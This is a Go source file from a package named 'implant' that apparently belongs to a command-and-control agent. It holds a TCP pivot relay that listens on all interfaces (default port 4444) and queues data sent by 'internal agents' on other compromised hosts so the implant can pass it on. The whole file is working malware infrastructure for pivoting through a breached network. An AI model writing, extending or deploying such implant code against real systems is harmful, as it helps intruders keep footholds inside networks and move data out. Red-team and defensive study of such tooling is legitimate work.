package implant

import (
	"fmt"
	"io"
	"net"
	"sync"
	"time"
)

const (
	tcpPivotTimeout    = 30 * time.Second
	tcpPivotBufferSize = 65536
	defaultTCPPort     = "4444"
)

// TCPRelay manages a TCP listener for cross-platform agent pivoting.
// Works on Linux and Windows — no named pipe dependency.
type TCPRelay struct {
	bindAddr string
	mu       sync.Mutex
	inbound  [][]byte
	running  bool
	stop     chan struct{}
	listener net.Listener
}

var activeTCPRelay *TCPRelay
var tcpRelayMu sync.Mutex

// StartTCPRelay starts a TCP relay listener on the given address.
// addr format: "0.0.0.0:4444" or just "4444" (defaults to 0.0.0.0)
func StartTCPRelay(addr string) ([]byte, error) {
	tcpRelayMu.Lock()
	defer tcpRelayMu.Unlock()

	if activeTCPRelay != nil && activeTCPRelay.running {
		return []byte(fmt.Sprintf("[!] TCP relay already running on %s", activeTCPRelay.bindAddr)), nil
	}

	if addr == "" {
		addr = "0.0.0.0:" + defaultTCPPort
	}
	// If only port given, prepend 0.0.0.0
	if addr[0] >= '0' && addr[0] <= '9' && !containsColon(addr) {
		addr = "0.0.0.0:" + addr
	}

	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return nil, fmt.Errorf("TCP relay listen on %s: %w", addr, err)
	}

	relay := &TCPRelay{
		bindAddr: ln.Addr().String(),
		running:  true,
		stop:     make(chan struct{}),
		listener: ln,
	}
	activeTCPRelay = relay

	go relay.listenLoop()

	port := addr
	if containsColon(addr) {
		_, p, err := net.SplitHostPort(addr)
		if err == nil {
			port = p
		}
	}

	return []byte(fmt.Sprintf("[+] TCP pivot relay started on %s\n[+] Internal agents connect via: <this-host>:%s",
		relay.bindAddr, port)), nil
}

// StopTCPRelay stops the active TCP relay.
func StopTCPRelay() ([]byte, error) {
	tcpRelayMu.Lock()
	defer tcpRelayMu.Unlock()

	if activeTCPRelay == nil || !activeTCPRelay.running {
		return []byte("[!] No TCP relay is running"), nil
	}

	activeTCPRelay.running = false
	close(activeTCPRelay.stop)
	activeTCPRelay.listener.Close()
	activeTCPRelay = nil
	return []byte("[+] TCP pivot relay stopped"), nil
}

// ListTCPPivots returns info about the active TCP relay.
func ListTCPPivots() ([]byte, error) {
	tcpRelayMu.Lock()
	defer tcpRelayMu.Unlock()

	if activeTCPRelay == nil || !activeTCPRelay.running {
		return []byte("No active TCP pivot relays"), nil
	}
	return []byte(fmt.Sprintf("Active TCP Pivot:\n  Bind:   %s\n  Status: running", activeTCPRelay.bindAddr)), nil
}

func (r *TCPRelay) listenLoop() {
	for r.running {
		conn, err := r.listener.Accept()
		if err != nil {
			select {
			case <-r.stop:
				return
			default:
				time.Sleep(100 * time.Millisecond)
				continue
			}
		}
		go r.handleConn(conn)
	}
}

func (r *TCPRelay) handleConn(conn net.Conn) {
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(tcpPivotTimeout))

	data, err := io.ReadAll(io.LimitReader(conn, tcpPivotBufferSize))
	if err != nil || len(data) == 0 {
		return
	}

	r.mu.Lock()
	r.inbound = append(r.inbound, data)
	r.mu.Unlock()
}

// GetPendingTCPRelayData returns and clears queued data from internal TCP agents.
func GetPendingTCPRelayData() [][]byte {
	tcpRelayMu.Lock()
	defer tcpRelayMu.Unlock()
	if activeTCPRelay == nil {
		return nil
	}
	activeTCPRelay.mu.Lock()
	defer activeTCPRelay.mu.Unlock()
	data := activeTCPRelay.inbound
	activeTCPRelay.inbound = nil
	return data
}

func containsColon(s string) bool {
	for _, c := range s {
		if c == ':' {
			return true
		}
	}
	return false
}
